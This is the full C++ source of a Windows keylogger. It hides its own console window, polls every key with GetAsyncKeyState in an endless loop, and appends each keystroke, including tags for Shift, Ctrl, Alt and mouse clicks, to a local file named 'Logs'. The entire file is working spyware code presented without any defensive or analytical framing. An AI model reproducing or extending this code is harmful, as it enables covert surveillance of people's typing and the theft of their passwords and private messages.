#include <Windows.h>
#include <winbase.h>
#include <iostream>
#include <fstream>
#include <Lmcons.h>



using namespace std;

string FILENAME = "Logs";
char EXENAME[MAX_PATH];
char USERNAME[UNLEN + 1];

class Logger {

public:

	int LOGCHAR(char KEY) {
		fstream LOGS;
		LOGS.open(FILENAME, fstream::app);
		LOGS << char(KEY);
		LOGS.close();
		return 1;
	}
	int LOG(string KEY) {
		fstream LOGS;
		LOGS.open(FILENAME, fstream::app);
		LOGS << string(KEY);
		LOGS.close();
		return 1;
	}

};

class KeyWatcher {

public:

	bool SpecialKeys(int KEY) {

		Logger print;

		switch (KEY) {

		default:
			return false;

		case VK_SPACE:
			cout << " ";
			print.LOG(" ");
			return true;

		case VK_RETURN:
			cout << "\n";
			print.LOG("\n");
			return true;

		case '¾':
			cout << ".";
			print.LOG(".");
			return true;

		case VK_SHIFT:
			cout << " #SHIFT ";
			print.LOG(" #SHIFT ");
			return true;

		case VK_BACK:
			cout << "\b";
			print.LOG("\b");
			return true;

		case VK_RBUTTON:
			cout << " #R_CLICK ";
			print.LOG(" #R_CLICK ");
			return true;

		case VK_LBUTTON:
			cout << " #L_CLICK ";
			print.LOG(" #L_CLICK ");
			return true;

		case VK_CAPITAL:
			cout << " #CAPS_LOCK ";
			print.LOG(" #CAPS_LOCK ");
			return true;

		case VK_TAB:
			cout << " #TAB ";
			print.LOG(" #TAB ");
			return true;

		case VK_UP:
			cout << " #UP ";
			print.LOG(" #UP_ARROW_KEY ");
			return true;

		case VK_DOWN:
			cout << " #DOWN ";
			print.LOG(" #DOWN_ARROW_KEY ");
			return true;

		case VK_LEFT:
			cout << " #LEFT ";
			print.LOG(" #LEFT_ARROW_KEY ");
			return true;

		case VK_RIGHT:
			cout << " #RIGHT ";
			print.LOG(" #RIGHT_ARROW_KEY ");
			return true;

		case VK_CONTROL:
			cout << " #CONTROL ";
			print.LOG(" #CONTROL ");
			return true;

		case VK_MENU:
			cout << " #ALT ";
			print.LOG(" #ALT ");
			return true;
		}
	}

	int Hook() {

		Logger print;

		char KEY = 'x';

		while (true) {

			for (KEY = 8; KEY <= 222; KEY++) {

				if (GetAsyncKeyState(KEY) == -32767) {

					if (SpecialKeys(KEY) == false) {

						cout << KEY;

						print.LOGCHAR(char(KEY));

					}

				}

			}

		}
	}

};

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	KeyWatcher start;
	start.Hook();

}
